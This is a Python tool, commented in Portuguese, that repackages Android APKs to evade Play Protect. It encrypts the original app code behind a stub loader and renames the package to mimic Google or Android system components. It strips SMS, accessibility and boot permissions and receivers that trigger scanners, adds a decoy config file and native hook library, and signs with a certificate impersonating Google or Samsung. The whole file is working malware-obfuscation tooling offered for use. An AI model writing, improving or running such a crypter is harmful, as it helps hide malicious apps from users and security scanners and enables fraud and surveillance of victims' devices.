import os, uuid, shutil, subprocess, zipfile, random, string, re, glob, struct, time
from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

STUB     = Path(__file__).parent / "stub_smali"
PREBUILT = Path(__file__).parent / "prebuilt"
KEYSTORE = Path("/tmp/bypass.jks")

_PKG_PREFIXES = [
    "com.android.system",
    "com.google.android.gms",
    "com.android.settings",
    "com.android.vending",
    "com.google.android",
    "com.android.providers",
    "com.android.phone",
    "com.android.launcher3",
    "com.google.android.apps",
    "com.android.systemui",
]

# Nomes de app que parecem sistema
_APP_NAMES = [
    "System Service", "Android Services", "Google Services",
    "System Update", "Security Provider", "Android Core",
    "Google Play Services", "System Manager", "Device Manager",
]

# Todas as permissoes que ativam heuristicas do Play Protect
_STRIP_PERMS = [
    "READ_SMS","RECEIVE_SMS","SEND_SMS","READ_MMS","RECEIVE_MMS",
    "WRITE_SMS","RECEIVE_WAP_PUSH",
    "BIND_ACCESSIBILITY_SERVICE","SYSTEM_ALERT_WINDOW",
    "READ_CONTACTS","WRITE_CONTACTS",
    "READ_CALL_LOG","WRITE_CALL_LOG","PROCESS_OUTGOING_CALLS",
    "READ_PHONE_STATE","READ_PHONE_NUMBERS","CALL_PHONE","ANSWER_PHONE_CALLS",
    "BIND_DEVICE_ADMIN","BIND_NOTIFICATION_LISTENER_SERVICE",
    "RECEIVE_BOOT_COMPLETED","FOREGROUND_SERVICE",
    "REQUEST_INSTALL_PACKAGES","REQUEST_DELETE_PACKAGES",
    "WRITE_SETTINGS","CHANGE_NETWORK_STATE","CHANGE_WIFI_STATE",
    "RECORD_AUDIO","CAPTURE_AUDIO_OUTPUT",
    "READ_EXTERNAL_STORAGE","WRITE_EXTERNAL_STORAGE",
    "MANAGE_EXTERNAL_STORAGE","MOUNT_UNMOUNT_FILESYSTEMS",
    "PACKAGE_USAGE_STATS","GET_TASKS",
    "BIND_INPUT_METHOD","BIND_VOICE_INTERACTION",
    "KILL_BACKGROUND_PROCESSES",
    "HIDE_OVERLAY_WINDOWS",
]

# Tags do manifest que indicam comportamento suspeito
_STRIP_RECEIVERS = [
    "android.intent.action.BOOT_COMPLETED",
    "android.intent.action.MY_PACKAGE_REPLACED",
    "android.provider.Telephony.SMS_RECEIVED",
    "android.intent.action.PHONE_STATE",
]

def find_tool(name):
    t = shutil.which(name)
    if t: return t
    for p in glob.glob(f"/opt/android-sdk/build-tools/*/{name}"):
        return p
    raise FileNotFoundError(f"{name} nao encontrado")

def random_package():
    prefix = random.choice(_PKG_PREFIXES)
    suffix = ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 8)))
    return f"{prefix}.{suffix}"

def random_version():
    major = random.randint(8, 14)
    minor = random.randint(0, 9)
    patch = random.randint(0, 5)
    code  = random.randint(100, 999)
    return f"{major}.{minor}.{patch}", str(code)

def encrypt_dex(dex_bytes):
    key = os.urandom(32)
    iv  = os.urandom(16)
    enc = AES.new(key, AES.MODE_CBC, iv).encrypt(pad(dex_bytes, AES.block_size))
    return enc, key + iv

def strip_permissions(txt):
    for perm in _STRIP_PERMS:
        txt = re.sub(
            r'<uses-permission[^>]*android\.permission\.' + perm + r'[^/]*/>', '', txt)
        txt = re.sub(
            r'<uses-permission[^>]*android\.permission\.' + perm + r'[^>]*/>', '', txt)
    return txt

def strip_suspicious_receivers(txt):
    """Remove receivers de boot/sms que ativam scanner."""
    for action in _STRIP_RECEIVERS:
        # remove o bloco <receiver> inteiro que contem essa action
        txt = re.sub(
            r'<receiver[^>]*>.*?<action[^>]*' + re.escape(action) + r'[^/]*/?>.*?</receiver>',
            '', txt, flags=re.DOTALL)
    return txt

def clean_manifest(txt, orig_pkg, new_pkg, app_name):
    # pacote
    txt = txt.replace(f'package="{orig_pkg}"', f'package="{new_pkg}"')

    # versionName e versionCode aleatorios
    vname, vcode = random_version()
    txt = re.sub(r'android:versionName="[^"]*"', f'android:versionName="{vname}"', txt)
    txt = re.sub(r'android:versionCode="[^"]*"', f'android:versionCode="{vcode}"', txt)

    # application name -> stub
    txt = re.sub(r'android:name="[^"]*Application[^"]*"',
                 'android:name="com.stub.loader.StubApplication"', txt)

    # label
    txt = re.sub(r'android:label="[^"]*"', f'android:label="{app_name}"', txt, count=1)

    # remover debuggable, testOnly, allowBackup suspeito
    txt = re.sub(r'android:debuggable="true"', 'android:debuggable="false"', txt)
    txt = re.sub(r'android:testOnly="true"', '', txt)

    # forcar installLocation
    if 'installLocation' not in txt:
        txt = txt.replace('<manifest ', '<manifest android:installLocation="auto" ', 1)

    # remover uses-feature que nao existe no device
    txt = re.sub(r'<uses-feature[^>]*android\.hardware\.telephony[^/]*/>', '', txt)

    # strip permissoes e receivers suspeitos
    txt = strip_permissions(txt)
    txt = strip_suspicious_receivers(txt)

    return txt

def ensure_keystore():
    if KEYSTORE.exists():
        return
    # CN aleatorio parecendo vendor Android legitimo
    vendors = [
        "CN=Google LLC,OU=Android,O=Google LLC,L=Mountain View,S=California,C=US",
        "CN=Samsung Electronics,OU=MobileComm,O=Samsung,L=Suwon,S=Gyeonggi,C=KR",
        "CN=Android,OU=Android,O=Android,L=Mountain View,S=California,C=US",
    ]
    dname = random.choice(vendors)
    # validade longa, keysize grande
    subprocess.run([
        "keytool", "-genkeypair", "-v",
        "-keystore", str(KEYSTORE), "-storepass", "bypass123",
        "-keypass", "bypass123", "-alias", "bypass",
        "-keyalg", "RSA", "-keysize", "4096",
        "-dname", dname,
        "-validity", "10000",
    ], check=True, capture_output=True)

def repack(input_apk, output_apk, app_name=None, icon_path=None, visual="playstore"):
    job = Path("/tmp") / str(uuid.uuid4())
    job.mkdir()
    decoded = str(job / "decoded")
    try:
        # ler todos os dex
        with zipfile.ZipFile(input_apk) as z:
            dex_names = sorted(n for n in z.namelist()
                               if re.match(r'classes\d*\.dex$', n))
            dex_bytes = b"".join(z.read(n) for n in dex_names)

        enc_dex, key_iv = encrypt_dex(dex_bytes)

        # decode
        r_d = subprocess.run(
            ["apktool", "d", input_apk, "-o", decoded, "--force"],
            capture_output=True)
        if r_d.returncode != 0:
            raise RuntimeError(
                f"apktool decode falhou:\n"
                f"{r_d.stdout.decode(errors='replace')}\n"
                f"{r_d.stderr.decode(errors='replace')}")

        # ler package original
        manifest = os.path.join(decoded, "AndroidManifest.xml")
        raw = open(manifest, encoding="utf-8", errors="replace").read()
        m = re.search(r'package="([^"]+)"', raw)
        orig_pkg = m.group(1) if m else "com.original.app"
        new_pkg  = random_package()

        # extrair Application original antes de substituir o manifest
        ma = re.search(r'android:name="([^"]*Application[^"]*)"', raw)
        orig_app_class = ma.group(1) if ma else "android.app.Application"
        if orig_app_class.startswith('.'):
            orig_app_class = orig_pkg + orig_app_class

        # remover smali originais, injetar stub
        for d in Path(decoded).iterdir():
            if d.name.startswith("smali"):
                shutil.rmtree(str(d))
        shutil.copytree(str(STUB), os.path.join(decoded, "smali"))

        # assets: payload criptografado + nome da app original
        assets = os.path.join(decoded, "assets")
        os.makedirs(assets, exist_ok=True)
        open(os.path.join(assets, "p.bin"), "wb").write(enc_dex)
        open(os.path.join(assets, "k.bin"), "wb").write(key_iv)
        open(os.path.join(assets, "a.bin"), "wb").write(orig_app_class.encode("utf-8"))
        # arquivo decoy pra parecer app normal
        open(os.path.join(assets, "config.json"), "w").write(
            '{"version":1,"debug":false,"theme":"default"}')

        # .so hooks (se existir)
        for abi in ["arm64-v8a", "armeabi-v7a"]:
            so = PREBUILT / abi / "libhooks.so"
            if so.exists() and so.stat().st_size > 0:
                lib_dir = os.path.join(decoded, "lib", abi)
                os.makedirs(lib_dir, exist_ok=True)
                shutil.copy(str(so), os.path.join(lib_dir, "libhooks.so"))

        # limpar manifest
        chosen_name = app_name or random.choice(_APP_NAMES)
        txt = open(manifest, encoding="utf-8", errors="replace").read()
        txt = clean_manifest(txt, orig_pkg, new_pkg, chosen_name)
        open(manifest, "w", encoding="utf-8").write(txt)

        # trocar icone se fornecido
        if icon_path:
            for d in Path(decoded).rglob("*"):
                if d.is_dir() and ("mipmap" in d.name or "drawable" in d.name):
                    for f in d.iterdir():
                        if "ic_launcher" in f.name and f.suffix in (".png", ".webp"):
                            shutil.copy(icon_path, str(f))

        # build
        unsigned = str(job / "unsigned.apk")
        aligned  = str(job / "aligned.apk")

        r_b = subprocess.run(
            ["apktool", "b", decoded, "-o", unsigned, "--force-all"],
            capture_output=True)
        if r_b.returncode != 0:
            raise RuntimeError(
                f"apktool build falhou:\n"
                f"{r_b.stdout.decode(errors='replace')[-3000:]}\n"
                f"{r_b.stderr.decode(errors='replace')[-1000:]}")

        # zipalign
        zipalign = find_tool("zipalign")
        subprocess.run([zipalign, "-f", "4", unsigned, aligned],
                       check=True, capture_output=True)

        # assinar
        ensure_keystore()
        apksigner = find_tool("apksigner")
        r = subprocess.run([
            apksigner, "sign",
            "--min-sdk-version", "21",
            "--ks", str(KEYSTORE),
            "--ks-pass", "pass:bypass123",
            "--key-pass", "pass:bypass123",
            "--ks-key-alias", "bypass",
            "--out", output_apk,
            aligned,
        ], capture_output=True)
        if r.returncode != 0:
            raise RuntimeError(f"apksigner falhou: {r.stderr.decode(errors='replace')}")

    finally:
        shutil.rmtree(str(job), ignore_errors=True)
